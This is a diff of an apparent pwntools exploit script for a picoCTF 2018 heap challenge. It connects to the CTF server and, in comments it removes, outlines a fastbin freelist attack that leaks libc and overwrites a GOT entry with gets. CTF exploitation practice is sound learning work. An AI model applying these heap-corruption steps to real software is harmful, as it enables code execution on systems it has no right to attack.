@@ -262,20 +262,6 @@ def leak(p, i):
 def break_heap():
     global cidx
     p = remote('2018shell2.picoctf.com', 42542)
-    #p = process(['/home/mithreindeir/picoctf/ld-linux-x86-64.so.2', '/home/mithreindeir/picoctf/cake'], setuid=False, env={"LD_PRELOAD":"./libc.so.6"})
-    '''
-        Fastbin freelist attack to control the counter array,
-        change pointer in counter array to @plt function, leak libc
-        overwrite entry in counter array during buffer write, then the 2nd time its
-        dereferenced in same function it will be pointing at a got entry, and can be
-        overwritten with a call to gets
-
-        reqs:
-        make() with idx = 0
-        malloc will return &shop
-        overwite counter[0] with got entry
-        counter[0] is dereferenced to set the price variable
-    '''
     '''
     set customers to 0x21 so we can control more of the array,
     and so that it is a valid chunk
